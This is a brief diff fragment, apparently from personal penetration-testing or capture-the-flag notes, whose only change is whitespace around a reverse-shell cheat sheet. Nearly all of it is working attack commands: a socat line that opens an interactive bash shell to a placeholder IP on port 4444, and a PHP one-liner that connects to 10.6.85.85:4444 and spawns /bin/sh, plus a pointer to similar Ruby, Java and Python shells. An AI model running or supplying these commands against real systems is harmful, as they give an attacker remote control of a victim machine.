@@ -15,8 +15,8 @@ socat
     socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444 
     
 PHP            
-
-   php -r '$sock=fsockopen("10.6.85.85",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 
+    
+    php -r '$sock=fsockopen("10.6.85.85",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 
    
 Also Ruby, Java and Python: Reverse shells cheat sheet    
 
